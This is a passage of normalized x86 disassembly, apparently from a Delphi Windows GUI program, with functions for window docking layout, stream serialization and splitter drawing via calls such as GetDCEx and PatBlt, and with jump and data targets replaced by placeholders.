pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e56c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41ca48
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d1bc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d15c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d15c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41ca48
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d15c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d15c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43e5f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_43e514
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_43e56c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_43e56c
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_43e514
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_43e56c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_43e56c
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_43e6d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e826
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_433790
mov eax [ ebp - 0x4 ]
call sub_41d194
xor eax eax
push ebp
push sub_43e809
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d520
xor eax eax
push ebp
push sub_43e7ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4380c0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e7f3
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d520
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434554
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43e834
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_439ec0
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4345fc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4345b8
mov ecx eax
xor edx edx
xor eax eax
call sub_412484
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43b390
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4124ac
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_43e9a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43e9a8
pop ecx
mov eax ebx
call sub_403128
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43e9a8
pop ecx
sub_43e9dc
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_43e9a8
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403128
xor eax eax
mov [ esi + 0x64 ] eax
sub_43ea38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43da48
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_43ea74
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ea74
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43ece1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov edx [ ebp - 0x8 ]
pop eax
call sub_404140
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov eax [ ebx + 0x14 ]
call sub_43d1d4
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405978
mov edx [ ebp - 0x10 ]
pop eax
call sub_404140
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ece8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e9c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_43d584
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_43d6fc
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_43d738
mov eax [ ebx + 0x18 ]
call sub_43d584
mov [ edx + 0x18 ] eax
push esi
push sub_43f284
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43dab0
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_43d738
mov eax [ esi + 0x64 ]
call sub_43d6fc
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403128
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_43f25c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403128
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_43d280
mov edx eax
mov eax edi
call sub_43d724
mov eax edi
call sub_43d584
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_43f284
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43dab0
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_43f284
mov edx [ eax + 0x14 ]
mov eax esi
call sub_43dab0
mov eax [ ebx + 0x14 ]
call sub_403128
mov eax edi
call sub_403128
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_43ecf0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_439ec0
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407ae4
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_43d724
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_439e2c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_43d724
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_43f10c
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_43f284
xor edx edx
mov eax edi
call sub_43dab0
sub_43edcc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d6fc
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_40291c
mov edx eax
mov eax ebx
call sub_43d724
sub_43ee08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404328
xor eax eax
push ebp
push sub_43ee73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404138
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee7a
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43ee80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43ef2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43d48c
mov eax [ ebp - 0x8 ]
call sub_43ee08
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_43ee80
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ef36
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_43ee80
pop ecx
sub_43ef3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43f075
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43f024
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_439e2c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f02b
mov eax [ ebp - 0x10 ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43ee08
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_439e40
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_43f02b
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_43ee80
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f07c
lea eax [ ebp - 0x14 ]
call sub_403e78
retn
sub_43f084
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43d7d4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d7fc
call sub_43f084
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d7d4
call sub_43f084
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_43d204
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_43d6fc
mov edx eax
mov eax ebx
call sub_43d724
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43d724
jmp r-xdata
sub_43f10c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_43f084
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_43f150
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d6fc
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_43d724
sub_43f180
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43b390
mov edx eax
mov eax [ rw-data ]
call sub_43fce0
mov eax [ ebx + 0x14 ]
call sub_43b390
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_43f294
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f1e0
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_43fce0
mov eax ebx
call sub_43f294
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_43d724
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_43d724
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43f10c
push ebx
push sub_43f284
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43dab0
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_43f25c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_439e2c
test eax eax
jle r-xdata
push ebx
push sub_43f284
xor edx edx
mov eax ebx
call sub_43dab0
sub_43f294
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_43d2c8
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_43d2c8
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_43d334
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_43d334
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41cd7c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_43f380
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43f380
pop ecx
mov eax ebx
call sub_43d6fc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d6fc
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43f380
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43d6fc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4233b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_43f410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d6fc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43d280
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_43d6fc
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_43f380
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f460
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_434554
